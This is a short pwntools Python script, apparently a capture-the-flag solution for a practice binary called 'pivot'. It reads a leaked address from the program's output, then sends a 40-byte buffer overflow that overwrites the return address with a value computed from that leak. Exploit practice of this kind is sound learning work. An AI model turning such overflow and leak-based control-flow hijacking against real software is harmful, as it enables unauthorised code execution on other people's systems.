from pwn import *

def start():
        global chall
        if args.REMOTE:
                chall = remote('localhost', 1337)
        else:
                chall = elf.process()

context.binary = elf = ELF('./pivot')
#libc = elf.libc
start()

payload = b'a\n' 
chall.send(payload)
res = chall.recvuntil(b'\nSend')
res = res.replace(b'\n',b' ').split()
leak_addr = int(res[-2].decode(),16) #0x7ff1155ecf10

payload = b'a' * 40 + p64(leak_addr +  0x213b71)
chall.sendline(payload)
t = chall.recvall(timeout=0.2)
print(t)

# with open('payload.txt', 'wb') as f:
#     f.write(b'a\n')
#     f.write(payload + b'\n')

# chall.recvall(timeout = 0.2)
